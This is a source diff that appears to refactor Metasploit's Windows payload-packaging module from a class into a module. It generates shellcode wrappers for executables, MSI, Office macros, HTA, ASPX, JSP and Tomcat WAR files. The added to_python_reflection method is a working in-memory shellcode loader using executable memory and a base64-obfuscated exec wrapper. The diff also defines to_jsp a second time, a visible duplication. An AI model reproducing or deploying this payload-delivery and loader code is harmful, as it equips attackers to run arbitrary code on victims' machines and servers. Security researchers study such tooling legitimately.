@@ -1,5 +1,9 @@
-class Msf::Util::EXE::Windows::Common
+module Msf::Util::EXE::Windows::Common
+  def self.included(base)
+    base.extend(ClassMethods)
+  end
 
+  module ClassMethods
   # exe_sub_method
   #
   # @param  code [String]
@@ -9,7 +13,7 @@ class Msf::Util::EXE::Windows::Common
   # @option opts [Boolean] :sub_method
   # @return      [String]
   def exe_sub_method(code,opts ={})
-    pe = self.get_file_contents(opts[:template])
+    pe = Msf::Util::EXE::Common.get_file_contents(opts[:template])
 
     case opts[:exe_type]
     when :service_exe
@@ -29,7 +33,7 @@ class Msf::Util::EXE::Windows::Common
       opts[:exe_max_sub_length] ||= 4096
     end
 
-    bo = self.find_payload_tag(pe, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag")
+    bo = Msf::Util::EXE::Common.find_payload_tag(pe, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag")
 
     if code.length <= opts.fetch(:exe_max_sub_length)
       pe[bo, code.length] = [code].pack("a*")
@@ -87,7 +91,7 @@ class Msf::Util::EXE::Windows::Common
   # @param arch The architecture, as one the predefined constants.
   # @param size [Integer] The size of the payload.
   # @param flavor [Nil,String] An optional DLL flavor, one of 'mixed_mode' or 'dccw_gdiplus'
-  private_class_method def set_template_default_winpe_dll(opts, arch, size, flavor: nil)
+  def set_template_default_winpe_dll(opts, arch, size, flavor: nil)
     return if opts[:template].present?
 
     # dynamic size upgrading is only available when MSF selects the template because there's currently no way to
@@ -109,19 +113,18 @@ class Msf::Util::EXE::Windows::Common
       flavor = '_' + flavor
     end
 
-    set_template_default(opts, "template_#{arch}_windows#{flavor}#{size_suffix}.dll")
+    Msf::Util::EXE::Common.set_template_default(opts, "template_#{arch}_windows#{flavor}#{size_suffix}.dll")
   end
 
 
   # Wraps an executable inside a Windows .msi file for auto execution when run
   #
-  # @param framework  [Msf::Framework]  The framework of you want to use
   # @param exe        [String]
   # @param opts       [Hash]
   # @option opts      [String] :msi_template_path
   # @option opts      [String] :msi_template
   # @return [String]
-  def to_exe_msi(framework, exe, opts = {})
+  def to_exe_msi( exe, opts = {})
     if opts[:uac]
       opts[:msi_template] ||= "template_windows.msi"
     else
@@ -146,7 +149,7 @@ class Msf::Util::EXE::Windows::Common
       template = File.join(opts[:msi_template_path], opts[:msi_template])
     end
 
-    msi = self.get_file_contents(template)
+    msi = Msf::Util::EXE::Common.get_file_contents(template)
 
     section_size = 2**(msi[30..31].unpack('v')[0])
 
@@ -231,7 +234,7 @@ class Msf::Util::EXE::Windows::Common
       end
     end
 
-    read_replace_script_template('to_exe.vba.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_exe.vba.template', hash_sub)
   end
 
   # to_vba
@@ -239,7 +242,7 @@ class Msf::Util::EXE::Windows::Common
   # @param framework  [Msf::Framework]
   # @param code       [String]
   # @param opts       [Hash]    Unused
-  def to_vba(framework, code, opts = {})
+  def to_vba(code='', opts = {})
     hash_sub = {}
     hash_sub[:var_myByte] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
     hash_sub[:var_myArray] = Rex::Text.rand_text_alpha(rand(3..9)).capitalize
@@ -263,16 +266,15 @@ class Msf::Util::EXE::Windows::Common
     # put the shellcode bytes into an array
     hash_sub[:bytes] = Rex::Text.to_vbapplication(code, hash_sub[:var_myArray])
 
-    read_replace_script_template('to_mem.vba.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_mem.vba.template', hash_sub)
   end
 
   # to_powershell_vba
   #
-  # @param framework  [Msf::Framework]
   # @param arch       [String]
   # @param code       [String]
   #
-  def to_powershell_vba(framework, arch, code)
+  def to_powershell_vba(arch, code)
     template_path = Rex::Powershell::Templates::TEMPLATE_DIR
 
     powershell = Rex::Powershell::Command.cmd_psh_payload(code,
@@ -294,7 +296,7 @@ class Msf::Util::EXE::Windows::Common
 
     hash_sub[:powershell] = vba_psh
 
-    read_replace_script_template('to_powershell.vba.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_powershell.vba.template', hash_sub)
   end
 
 
@@ -338,7 +340,7 @@ class Msf::Util::EXE::Windows::Common
       hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
     end
 
-    read_replace_script_template('to_exe.vbs.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_exe.vbs.template', hash_sub)
   end
 
   # to_exe_asp
@@ -357,7 +359,7 @@ class Msf::Util::EXE::Windows::Common
     hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8..15))
     hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8..15))
     hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
-    read_replace_script_template('to_exe.asp.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_exe.asp.template', hash_sub)
   end
 
   # self.to_exe_aspx
@@ -374,10 +376,10 @@ class Msf::Util::EXE::Windows::Common
     hash_sub[:var_iterator] = Rex::Text.rand_text_alpha(rand(8..15))
     hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8..15))
     hash_sub[:shellcode] = Rex::Text.to_csharp(exes, 100, hash_sub[:var_file])
-    read_replace_script_template('to_exe.aspx.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_exe.aspx.template', hash_sub)
   end
 
-  def to_mem_aspx(framework, code, exeopts = {})
+  def to_mem_aspx(code = '', exeopts = {})
     # Initialize rig and value names
     rig = Rex::RandomIdentifier::Generator.new
     rig.init_var(:var_funcAddr)
@@ -389,14 +391,14 @@ class Msf::Util::EXE::Windows::Common
     hash_sub = rig.to_h
     hash_sub[:shellcode] = Rex::Text.to_csharp(code, 100, rig[:var_bytearray])
 
-    read_replace_script_template('to_mem.aspx.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_mem.aspx.template', hash_sub)
   end
 
-  def to_win32pe_psh_net(framework, code, opts = {})
+  def to_win32pe_psh_net(code, opts = {})
     Rex::Powershell::Payload.to_win32pe_psh_net(Rex::Powershell::Templates::TEMPLATE_DIR, code)
   end
 
-  def to_win32pe_psh(framework, code, opts = {})
+  def to_win32pe_psh(code, opts = {})
     Rex::Powershell::Payload.to_win32pe_psh(Rex::Powershell::Templates::TEMPLATE_DIR, code)
   end
 
@@ -405,11 +407,11 @@ class Msf::Util::EXE::Windows::Common
   # Tweaked by shellster
   # Originally from PowerSploit
   #
-  def to_win32pe_psh_reflection(framework, code, opts = {})
+  def to_win32pe_psh_reflection(code, opts = {})
     Rex::Powershell::Payload.to_win32pe_psh_reflection(Rex::Powershell::Templates::TEMPLATE_DIR, code)
   end
 
-  def to_powershell_command(framework, arch, code)
+  def to_powershell_command(arch, code)
     template_path = Rex::Powershell::Templates::TEMPLATE_DIR
     Rex::Powershell::Command.cmd_psh_payload(code,
                                               arch,
@@ -418,7 +420,7 @@ class Msf::Util::EXE::Windows::Common
                                               method: 'reflection')
   end
 
-  def to_powershell_ducky_script(framework, arch, code)
+  def to_powershell_ducky_script(arch, code)
     template_path = Rex::Powershell::Templates::TEMPLATE_DIR
     powershell = Rex::Powershell::Command.cmd_psh_payload(code,
                                                           arch,
@@ -427,10 +429,40 @@ class Msf::Util::EXE::Windows::Common
                                                           method: 'reflection')
     replacers = {}
     replacers[:var_payload] = powershell
-    read_replace_script_template('to_powershell.ducky_script.template', replacers)
+    Msf::Util::EXE::Common.read_replace_script_template('to_powershell.ducky_script.template', replacers)
   end
+  
+  def to_python_reflection(arch, code, exeopts)
+        unless [ ARCH_X86, ARCH_X64, ARCH_AARCH64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_PPC ].include? arch
+          raise "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
+        end
 
-  def to_powershell_hta(framework, arch, code)
+        python_code = <<~PYTHON
+          #{Rex::Text.to_python(code)}
+          import ctypes,os
+          if os.name == 'nt':
+           cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
+           ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+           ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
+           ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
+           ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
+           ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+          else:
+           import mmap
+           from ctypes.util import find_library
+           c = ctypes.CDLL(find_library('c'))
+           c.mmap.restype = ctypes.c_void_p
+           ptr = c.mmap(0,len(buf),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
+           ctypes.memmove(ptr,buf,len(buf))
+           c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
+           c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
+           ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+        PYTHON
+
+        "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(python_code)}')[0]))"
+      end
+
+  def to_powershell_hta(arch, code)
     template_path = Rex::Powershell::Templates::TEMPLATE_DIR
 
     powershell = Rex::Powershell::Command.cmd_psh_payload(code,
@@ -448,7 +480,7 @@ class Msf::Util::EXE::Windows::Common
     hash_sub = rig.to_h
     hash_sub[:powershell] = powershell
 
-    read_replace_script_template('to_powershell.hta.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_powershell.hta.template', hash_sub)
   end
 
   def to_jsp(exe)
@@ -468,7 +500,7 @@ class Msf::Util::EXE::Windows::Common
     payload_hex = exe.unpack('H*')[0]
     hash_sub[:payload] = payload_hex
 
-    read_replace_script_template('to_exe.jsp.template', hash_sub)
+    Msf::Util::EXE::Common.read_replace_script_template('to_exe.jsp.template', hash_sub)
   end
 
   # Creates a Web Archive (WAR) file containing a jsp page and hexdump of a
@@ -485,12 +517,96 @@ class Msf::Util::EXE::Windows::Common
     to_war(template, opts)
   end
 
-  def to_win32pe_vbs(framework, code, opts = {})
-    to_exe_vbs(to_win32pe(framework, code, opts), opts)
+
+       def to_jsp(exe)
+        hash_sub = {}
+        hash_sub[:var_payload] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_exepath] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_outputstream] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_payloadlength] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_bytes] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_counter] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_exe] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_fperm] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_fdel] = Rex::Text.rand_text_alpha(rand(8..15))
+        hash_sub[:var_exepatharray] = Rex::Text.rand_text_alpha(rand(8..15))
+
+        payload_hex = exe.unpack('H*')[0]
+        hash_sub[:payload] = payload_hex
+
+        Msf::Util::EXE::Common.read_replace_script_template('to_exe.jsp.template', hash_sub)
+      end
+  
+        # Creates a Web Archive (WAR) file from the provided jsp code.
+      #
+      # On Tomcat, WAR files will be deployed into a directory with the same name
+      # as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
+      # server is in a default configuration, deoployment will happen
+      # automatically. See
+      # {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
+      # documentation} for a description of how this works.
+      #
+      # @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
+      #   in the archive. This will be compiled by the victim servlet container
+      #   (e.g., Tomcat) and act as the main function for the servlet.
+      # @param opts [Hash]
+      # @option opts :jsp_name [String] Name of the <jsp-file> in the archive
+      #   _without the .jsp extension_. Defaults to random.
+      # @option opts :app_name [String] Name of the app to put in the <servlet-name>
+      #   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
+      #   random.
+      # @option opts :extra_files [Array<String,String>] Additional files to add
+      #   to the archive. First element is filename, second is data
+      #
+      # @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
+      #
+      # @return [String]
+      def to_war(jsp_raw, opts = {})
+        jsp_name = opts[:jsp_name]
+        jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8..15))
+        app_name = opts[:app_name]
+        app_name ||= Rex::Text.rand_text_alpha_lower(rand(8..15))
+
+        meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
+        manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
+        web_xml = %q{<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC
+"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
+"http://java.sun.com/dtd/web-app_2_3.dtd">
+<web-app>
+<servlet>
+<servlet-name>NAME</servlet-name>
+<jsp-file>/PAYLOAD.jsp</jsp-file>
+</servlet>
+</web-app>
+}
+        web_xml.gsub!('NAME', app_name)
+        web_xml.gsub!('PAYLOAD', jsp_name)
+
+        zip = Rex::Zip::Archive.new
+        zip.add_file('META-INF/', '', meta_inf)
+        zip.add_file('META-INF/MANIFEST.MF', manifest)
+        zip.add_file('WEB-INF/', '')
+        zip.add_file('WEB-INF/web.xml', web_xml)
+        # add the payload
+        zip.add_file("#{jsp_name}.jsp", jsp_raw)
+
+        # add extra files
+        if opts[:extra_files]
+          opts[:extra_files].each { |el| zip.add_file(el[0], el[1]) }
+        end
+
+        zip.pack
+      end
+  
+
+  def to_win32pe_vbs(code, opts = {})
+    to_exe_vbs(to_win32pe(code, opts), opts)
   end
 
-  def to_win64pe_vbs(framework, code, opts = {})
-    to_exe_vbs(to_win64pe(framework, code, opts), opts)
+  def to_win64pe_vbs(code, opts = {})
+    to_exe_vbs(to_win64pe(code, opts), opts)
   end
 
   # Creates a jar file that drops the provided +exe+ into a random file name
@@ -539,9 +655,9 @@ class Msf::Util::EXE::Windows::Common
   # @return      [String]
   def to_dotnetmem(base = 0x12340000, data = '', opts = {})
     # Allow the user to specify their own DLL template
-    set_template_default(opts, 'dotnetmem.dll')
+    Msf::Util::EXE::Common.set_template_default(opts, 'dotnetmem.dll')
 
-    pe = get_file_contents(opts[:template])
+    pe = Msf::Util::EXE::Common.get_file_contents(opts[:template])
 
     # Configure the image base
     base_offset = opts[:base_offset] || 180
@@ -818,4 +934,10 @@ payload:
     end
     res
   end
+  end
+
+  class << self
+    include ClassMethods
+  end
 end
+
